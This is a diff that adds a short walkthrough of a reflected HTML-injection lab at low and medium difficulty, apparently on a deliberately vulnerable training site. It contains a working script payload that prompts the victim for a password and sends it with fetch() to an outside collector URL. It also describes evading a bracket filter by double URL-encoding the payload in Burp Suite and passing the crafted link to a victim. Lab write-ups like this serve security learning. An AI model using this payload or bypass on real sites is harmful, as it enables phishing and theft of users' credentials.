@@ -1,0 +1,29 @@
+///LVL: Low///
+-------------
+HTML Injection - Reflected (GET)
+
+on this lvl, when trying to write some tags inside the forms "First name" / "Last name", it seems nothing
+is SANITIZE or replace the user inputs. Let's try inject the following code: "<h1>Adkali</h1>"
+
+We can se that nothing seems to stop us from injection a malicious code inside the form.
+We can even edit the parameters on the top (GET), and sent it to the victim with a better code.
+Let's try to inject for learning purpose the next code:
+
+"<script>var password = prompt("Please enter your password again"); fetch("https://enca62lbf3jls.x.pipedream.net/"+password); alert("Accepted, Enjoy.");</script>"
+
+As you can see, a prompt jumped asking for password, after user insert it, it thanks him.
+what he doesnt know that the password was already sent to the attacker that waited for him to made this mistake.
+
+///LVL: Medium///
+----------------
+
+On this lvl, it seems the site filters "<" and ">" while using them.
+when trying inject some tag using script, it results in nothing.
+
+"<script>alert("Adkali");</script>"
+
+Using BurpSuite Decoder.Encoder, we can select some smart encode fucntions.
+when selecting to encode the java code into URL, it reflected back to the source as the malicious code.
+Nothing stop us from injectin it even on the parameters, and sent it to the victim.
+
+**Note: use Encode Twice for this**
